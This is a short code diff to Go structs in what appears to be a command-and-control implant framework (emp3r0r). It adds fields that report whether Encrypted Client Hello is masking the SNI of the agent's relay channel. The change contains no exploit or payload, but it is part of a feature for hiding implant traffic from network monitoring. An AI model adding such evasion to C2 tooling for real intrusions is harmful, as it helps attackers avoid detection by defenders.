@@ -48,6 +48,7 @@ type Emp3r0rAgent struct {
 	Files          []string      `cbor:"40,keyasint"` // list of available files/modules in agent storage/MemFS
 	GOArch         string        `cbor:"41,keyasint"` // runtime.GOARCH of the agent binary (not the OS kernel arch)
 	ExternalIP     string        `cbor:"42,keyasint"` // agent's public egress IP, self-detected via public echo services (ip.sb etc.); meaningful when CC only sees the relay's address
+	ECHStatus      string        `cbor:"43,keyasint"` // ECH state of the relay channel: armed (SNI masked), degraded (fell back to plain SNI), or off
 }
 
 // EnrichedPeer holds detailed peer information signed by C2
@@ -88,6 +89,7 @@ type MsgTunData struct {
 	EphemPublicKey   []byte            `cbor:"8,keyasint"`  // ephemeral public key for ECDH key exchange
 	PeerList         []string          `cbor:"9,keyasint"`  // pushed by CC to help with discovery
 	EnrichedPeerList *EnrichedPeerList `cbor:"10,keyasint"` // C2 CA-signed enriched peer list
+	ECHStatus        string            `cbor:"11,keyasint"` // ECH state carried on keep-alive hellos (armed/degraded/off + reason)
 }
 
 // TokenEntry is one entry of a !list_tokens response, marshaled as CBOR by
